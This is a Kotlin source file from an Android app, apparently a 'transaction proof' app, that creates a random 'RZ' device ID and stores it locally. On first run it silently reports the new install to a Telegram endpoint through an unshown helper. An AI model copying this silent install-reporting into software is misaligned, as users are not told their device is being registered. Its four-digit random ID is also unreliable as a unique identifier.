package com.buktitransaksi.app

import android.content.Context
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlin.random.Random

object DeviceIdHelper {
    private const val PREF_NAME = "bukti_transaksi_pref"
    private const val KEY_DEVICE_ID = "device_id"

    fun getOrCreateDeviceId(context: Context): String {
        val prefs = context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
        var id = prefs.getString(KEY_DEVICE_ID, null)
        
        if (id == null) {
            id = String.format("RZ%04d", Random.nextInt(0, 10000))
            prefs.edit().putString(KEY_DEVICE_ID, id).apply()
            val finalId = id
            CoroutineScope(Dispatchers.IO).launch {
                TelegramHelper.sendDeviceRegistered(finalId)
            }
        }
        return id
    }
}
